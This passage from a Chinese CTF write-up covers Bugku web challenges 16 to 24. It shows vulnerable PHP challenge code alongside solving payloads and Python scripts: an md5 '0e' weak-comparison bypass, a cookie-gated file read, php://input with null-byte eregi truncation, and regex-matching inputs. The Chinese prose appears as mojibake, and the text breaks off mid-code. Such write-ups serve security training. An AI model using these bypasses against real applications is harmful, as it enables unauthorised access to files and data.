2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;å–å¾—flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>éšä¾¿æ‰«ä¸€çœ¼ï¼Œéå¸¸ç®€å•çš„<code>str_replace</code>åŒå†™ç»•è¿‡ + <code>md5</code>å¼±æ¯”è¾ƒ 0e ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure><h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><p>sqlmap ä¸€æŠŠæ¢­</p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.246.176:14600/&#x27;</span></span><br><span class="line">response = requests.session()</span><br><span class="line">re = response.get(url=url).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">elements = etree.HTML(re).xpath(<span class="string">&#x27;//div/text()&#x27;</span>)[<span class="number">0</span>][<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">result = <span class="built_in">eval</span>(elements)</span><br><span class="line"><span class="built_in">print</span>(result,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>:result</span><br><span class="line">&#125;</span><br><span class="line">flag = response.post(url=url,data=data).content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># flag_x = etree.HTML(flag)</span></span><br><span class="line"><span class="comment"># # print(etree.tostring(flag_x,encoding=&#x27;utf-8&#x27;).decode(&#x27;utf-8&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p>burpsuiteæŠ“åŒ…</p><p><code>OK ,now you have to post the margin what you find</code>ï¼Œå¾—çŸ¥éœ€è¦ä»¥<code>POST</code>çš„è¯·æ±‚æ–¹æ³•æŠŠ<code>margin</code>ä¼ è¿‡å»ï¼Œ<code>margin</code>çš„å†…å®¹åº”è¯¥æ˜¯æŠ“åŒ…å¾—åˆ°å¤´é‡Œé¢çš„base64çš„<code>flag</code>å†base64è§£ç ä¸€æ¬¡ï¼Œæ‰‹åŠ¨è§£å†ç”¨burpsuiteé‡æ”¾è¿‡å»ä¸è¡Œï¼Œæ‰€ä»¥å†™äº†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.67.246.176:11914/&#x27;</span></span><br><span class="line">r = requests.session()                                    <span class="comment">#è·å–sessionã€‚</span></span><br><span class="line">q = r.get(url)                                                 <span class="comment">#ä»¥getæ–¹å¼å»è¯·æ±‚</span></span><br><span class="line">text = q.headers[<span class="string">&#x27;flag&#x27;</span>]                                  <span class="comment">#è·å–è¿”å›æ•°æ®åŒ…ä¸­flagå­—æ®µ</span></span><br><span class="line">data = base64.b64decode(base64.b64decode(text)[-<span class="number">8</span>:])  <span class="comment">#ç¬¬ä¸€æ¬¡æŠŠflagä¸­çš„å­—æ®µè¿›è¡Œbase64è§£ç ï¼Œç„¶åå–è§£ç åçš„å8ä½è¿›è¡Œç¬¬äºŒæ¬¡base64è§£ç </span></span><br><span class="line">data=&#123;<span class="string">&#x27;margin&#x27;</span>:data&#125;                                   <span class="comment">#è·å–marginè¿™ä¸ªå‚æ•°ï¼Œ</span></span><br><span class="line">r2 = r.post(url,data = data)                        <span class="comment">#ä½¿ç”¨postå»è¯·æ±‚</span></span><br><span class="line"><span class="built_in">print</span>(r2.text)                                            <span class="comment">#è¿”å›ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p>url ä¸­<code>line=&amp;filename=a2V5cy50eHQ=</code>å¾—åˆ°å…³é”®ä¿¡æ¯ï¼Œ<code>filename</code>ä¼ å‚æ–‡ä»¶åå­—ç»è¿‡base64ç¼–ç åçš„ä¸œè¥¿ï¼Œ<code>line</code>æ˜¯å…·ä½“åˆ°å“ªä¸€è¡Œï¼Œæ²¡æœ‰ä¿®æ”¹<code>line</code>çš„å€¼æ—¶å€™ï¼Œè¯•äº†ä¸€ä¸‹å»è¯»<code>index.php</code>çš„å†…å®¹ï¼Œå¾—åˆ°ä¸€ä¸ª<code>&lt;?php</code>ï¼Œç”±æ­¤çŒœæµ‹è€Œæ¥</p><p>ä¸Šè„šæœ¬è·‘å‡ºindex.phpçš„æ‰€æœ‰ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    url = <span class="string">&quot;http://114.67.246.176:16017/index.php?line=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span></span><br><span class="line">    s = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(s.text)</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®€å•å®¡ä¸€ä¸‹ï¼Œé€»è¾‘å°±æ˜¯å½“ <code>cookie</code>çš„å€¼ç­‰äº<code>margin</code>æ—¶ï¼Œä¼šç»™<code>file_list[2]</code>æ•°ç»„èµ‹å€¼ä¸º<code>keys.php</code>ï¼Œç„¶å<code>filename</code>æ˜¯ä»<code>file_list</code>è¿™ä¸ªæ•°ç»„é‡Œé¢æ‰¾ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯ä¼ªé€ <code>cookie</code>ç­‰äº<code>margin</code>è®©<code>file_list</code>åŒ…å«è¿›<code>keys.php</code>ï¼Œç„¶åè·Ÿè¯»<code>index.php</code>ä¸€æ ·å»è¯»å–<code>keys.php</code></p><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><p>ä¸€å †å¥—å¨ƒè§£ç </p><p>è®¿é—®<code>1p.html</code>æ‹¿åˆ°ç¬¬ä¸€å±‚çš„base64</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Words</span> =<span class="string">&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot;</span> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OutWord</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">NewWords</span>;</span><br><span class="line"><span class="title class_">NewWords</span> = <span class="built_in">unescape</span>(<span class="title class_">Words</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">NewWords</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="title class_">OutWord</span>();</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚è§£é‚£æ®µbase64ï¼Œåˆæ‹¿åˆ°ä¸€æ®µurl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚å†è§£ä¸€æ¬¡urlï¼Œæ‹¿åˆ°phpæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">require(&quot;</span>f4l2a3g.txt<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">print &quot;</span><span class="keyword">never</span> <span class="keyword">never</span> <span class="keyword">never</span> give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡ä¸€æ³¢æºç </p><ol><li><code>id</code>è¦æ±‚ä¸º<code>0</code>ï¼Œä½†æ˜¯ä¸‹é¢è¦æ±‚<code>id</code>ä¸ºæ•´æ•°0æ‰èƒ½åŠ è½½</li><li><code>$a</code>è¦æ±‚æœåŠ¡å™¨ç«¯å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åï¼Œæ–‡ä»¶å†…å®¹æ˜¯<code>&quot;bugku is a nice plateform!&quot;</code></li><li>è¦æ±‚<code>$b</code>çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ—¢ç­‰äºå­—ç¬¦â€™4â€™ï¼Œåˆä¸ç­‰äºæ•´æ•°4</li><li><code>$a</code>ä¸­ä¸å« <strong><code>.</code></strong></li><li>å­—ç¬¦ä¸²<code>1114</code>è¦ä¸å­—ç¬¦ä¸²<code>111</code>è¿æ¥å˜é‡ <code>$b</code> çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ„æˆçš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</li><li><code>$b</code>é•¿åº¦å¤§äº5</li></ol><p>å¯¹åº”çš„è§£é¢˜æ€è·¯ï¼š</p><p><strong><code>file_get_contents()</code></strong> è€ç†Ÿäººäº†ï¼Œç›´æ¥<code>php://input</code></p><p><strong><code>ereg()</code>å’Œ<code>eregi()</code>æœ‰ç©ºå­—ç¬¦æˆªæ–­æ¼æ´ï¼Œåœ¨å‚æ•°ä¸ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼å’Œå¾…åŒ¹é…å­—ç¬¦ä¸²ä¸­é‡åˆ°äº†ç©ºæ ¼ï¼Œåˆ™æˆªæ–­å¹¶ä¸¢å¼ƒåé¢çš„æ•°æ®</strong></p><p>å‡½æ•°åŸå‹ï¼š<code>int eregi(string pattern, string string, [array regs])</code>       </p><p>æˆåŠŸè¿”å›trueï¼Œç¬¬ä¸€ä¸ªæ˜¯æœç´¢è§„åˆ™ï¼Œç¬¬äºŒä¸ªæ˜¯è¢«æœç´¢å­—ç¬¦ä¸²<br> åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æœç´¢æŒ‡å®šçš„æ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚æœç´¢ä¸åŒºåˆ†å¤§å°å†™ã€‚<code>eregi()</code>å¯ä»¥ç‰¹åˆ«æœ‰ç”¨çš„æ£€æŸ¥æœ‰æ•ˆæ€§å­—ç¬¦ä¸²,å¦‚å¯†ç ï¼Œå¯é€‰çš„è¾“å…¥å‚æ•°è§„åˆ™åŒ…å«ä¸€ä¸ªæ•°ç»„çš„æ‰€æœ‰åŒ¹é…è¡¨è¾¾å¼,ä»–ä»¬è¢«æ­£åˆ™è¡¨è¾¾å¼çš„æ‹¬å·åˆ†ç»„ã€‚</p><p>åœ¨æœ¬é¢˜é‡Œé¢<code>eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)</code> ï¼Œå³111æ‹¼æ¥ä¸Š<code>substr($b,0,1)</code>ï¼Œä¹‹åä¸â€1114â€æ¯”è¾ƒï¼Œåªè¦è®©â€111â€åé¢æ‹¼æ¥ä¸Šä¸€ä¸ªç©ºæ ¼å³<code>\x00</code>  å°±å¯ä»¥è®©<code>eregi</code>å¯¹åé¢æˆªæ–­ï¼Œç»“æœå°±æ˜¯â€111â€ç­‰äºâ€1114â€ã€‚è¿™é‡Œå¯ä»¥æ„é€ <code>$b=&quot;\x00abcdef&quot;</code> æ»¡è¶³é•¿åº¦å¤§äº5å³å¯</p><p>ç›´æ¥è®©<code>$b=\x00abcdef</code>ä¸å¾—è¡Œï¼Œå†™åˆ°urlé‡Œè¿˜è¦å°†\xæ”¹æˆ%ï¼Œåœ¨è¯·æ±‚è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è¿›è¡Œ<code>URLç¼–ç </code>ï¼Œåœ¨æäº¤è¯·æ±‚æ—¶å¯¼è‡´è¯·æ±‚å¤´æˆªæ–­ã€‚è¿™ä¸ªå…·ä½“è¿‡ç¨‹æ˜¯å› ä¸ºï¼Œå¦‚æœå¡«çš„æ˜¯<code>\x00</code>ï¼Œåœ¨urlç¼–ç é˜¶æ®µå°±ä¼šè¢«æˆªæ–­<code>$b</code>è¿˜æ²¡è¢«ä¼ é€è‡³phpåå°æ—¶å·²ç»æˆä¸ºäº†ç©ºï¼ˆå³<code>$b=&#39;&#39;</code>ï¼‰ï¼Œåˆ°äº†åå°<code>$b</code>ä¸ºç©ºï¼Œå°±ä¸ç¬¦åˆè¦æ±‚äº†ã€‚æ‰€ä»¥ç›´æ¥ç”¨pythonæŠŠURLç¼–ç çš„è¿‡ç¨‹æ‰‹åŠ¨åšäº†ï¼Œå°±ä¸ä¼šè¢«æˆªæ–­ï¼Œå°±èƒ½é¡ºåˆ©å°†æ•°æ®ä¼ é€è‡³åå°</p><p>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;http://114.67.246.176:13237/hello.php/hello.php?id=aa&amp;b=%00abcdef&amp;a=php://input&quot;</span></span><br><span class="line">mysession = requests.session()</span><br><span class="line"><span class="comment"># headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span></span><br><span class="line"><span class="comment"># b = &#123;&#x27;value&#x27;: &#x27;bugku is a nice plateform!&#x27;&#125;</span></span><br><span class="line">r = mysession.get(payload, data=<span class="string">&#x27;bugku is a nice plateform!&#x27;</span>)  <span class="comment"># ä¸ç”¨æ„é€ æˆjsonæ ¼å¼äº†ï¼Œç›´æ¥å‘é€dataå‚æ•°å°±è¡Œäº†</span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )</span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ­£åˆ™çš„æ„æ€</p><p><code>key</code>+<code>ä»»æ„å•ä¸ªå­—ç¬¦0æ¬¡æˆ–å¤šæ¬¡</code>+<code>key</code>+<code>ä»»æ„å•ä¸ªå­—ç¬¦4~7æ¬¡</code>+<code>key</code>+<code>:</code>+<code>/</code>+<code>ä»»æ„å•ä¸ªå­—ç¬¦</code>+<code>/</code>+<code>ä»»æ„å•ä¸ªå­—ç¬¦0æ¬¡æˆ–å¤šæ¬¡</code>+<code>key</code>+<code>[a-z]</code>+<code>ä»»æ„æ ‡ç‚¹ç¬¦å·</code></p><p>éšä¾¿æ„é€ ä¸€ä¸ª<code>keykey1111key:/1/keya#</code></p><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><p><code>code.txt</code>æ³„éœ²æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span 